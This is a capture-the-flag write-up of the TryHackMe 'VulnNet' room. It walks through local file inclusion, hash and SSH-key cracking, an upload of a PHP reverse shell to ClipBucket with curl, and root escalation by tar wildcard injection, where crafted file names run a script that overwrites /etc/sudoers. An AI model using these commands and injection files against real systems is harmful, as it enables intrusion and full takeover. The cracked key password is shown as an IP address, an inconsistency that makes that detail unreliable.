---
layout: post
title: THM Vulnnet WriteUp
date: 2025-09-11 01:50 -0400
tags: ["thm","writeup","lfi","web"]
---

In this occasion we will be solving TryHackMe's room
URL: https://tryhackme.com/room/vulnnet1

### RECON

**ports 22,80**

```bash
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
Apache version: Apache/2.4.29 (Ubuntu)"]
SSH: "SSH-2.0-OpenSSH_7.6p1
Linux: Ubuntu
```

**subdomain enumeration**
```
ffuf -u http://vulnnet.thm/ -w ~/hdd/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.vulnnet.thm" -ac
```

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250909.png)

Accessing the site we receive a basic Apache authentication login page

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-1.png)

Analyzing the js files we can find a little hint a possible referer, so we can try file inclusion vulnerabilities.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-2.png)

We can see that the file /etc/passwd is being reflected, so we can go further this.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-3.png)

Using intruder we will choose this Seclists Fuzzing LFI wordlist to find all the possible files with sensitive information inside the box.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-6.png)

We got a hit here, the file .htpasswd contains the credentials for accessing the protected broadcast.vulnnet.thm resource.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-4.png)

So we get an username and a encrypted hash, we can use hashcat to crack it as follows.

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

```
hashcat -m 1600 -a 0 hash.txt ~/hdd/wordlists/rockyou.txt
```

Crack .htpasswd

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910.png)

The plaintext password would be the following

```
developers:9972761drmfsls
```

The we will try to login the secondary website, some inspection and we now its a Clipbucket instance.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-7.png)

## LOW LEVEL USER

In order to exploit an access the host machine we can exploit a known vulnerability of this deployment.

https://sec-consult.com/vulnerability-lab/advisory/os-command-injection-arbitrary-file-upload-sql-injection-in-clipbucket/

```bash
#curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php" "http://$HOST/actions/beats_uploader.php"
```

Because the instance is behind an authentication window, we should also provide the basic auth header, being a Base64 representation of the username:password.

Also we can use a php-reverse-sell.php as this file will be granting us a reverse shell in the box.

```
curl -X POST -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==" -F "file=@/home/c/hdd/scripts/WebShell/Php/php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```

**Response**

This response indicates that the file has been correctly uploaded, we should take note of the filename and the path.

```bash
creating file{"success":"yes","file_name":"1757540582b1fa96","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"} %
```


**Triggering the reverse shell**

Just make a simple curl request replacing the placeholders with the data of the already uploaded

```
curl http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/175755542330361a.php -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw=="
```

I won't discus in detail how to upgrade a shell so let's go directly to post exploitation.


## Privilege Escalation

Using pspy we can see the tools or crons that are constantly being executed in the host machine, I Found this script but we cannot write or do anything without low level user permissions, but it will be useful later.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250910-10.png)

The script basically makes a backup of an entire folder using tar command utility

```bash
#!/bin/bash
# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest

```

## LOOKING FOR USER.TXT

Looking around in the backup directory we can see this interesting file.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250911-3.png)

Now we proceed to copy un unzip found ssh private key, however its encrypted so we have to crack it first.

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250911-4.png)

For this purpose we will be using john jumbo suite, and specifically the following script to get a crackable hash representation of the password.

```
python3 ssh2john.py /tmp/id_rsa > /tmp/id_rsa.txt
```

Now that we have a working hash, we proceed to crack it with john.

```bash
/run/john --wordlist=/home/c/hdd/wordlists/rockyou.txt /tmp/id_rsa.txt
```

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250911.png)

We get the following password

```
id_rsa:10.201.86.192
```

Then we need to use openssl to decrypt the key as follows.

```bash
openssl rsa -in id_rsa -out unencrypted_id_rsa
chmod 0400 unencrypted_id_rsa
```

Login as user 'server-management' only have two users that are able to login

**Upgrade to rootl**

```bash
# 1. Create files in the current directory called  
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'  
  
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh privesc.sh'  
  
# 2. Create a privesc.sh bash script, that allows for privilege escalation  
#malicous.sh:  
echo 'server-management ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

After the execution of the cron task just type

```
sudo su
```

![](/assets/img/posts/2025-09-11-thm-vulnnet-writeup/vulnnet-20250911-2.png)




---

REF: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
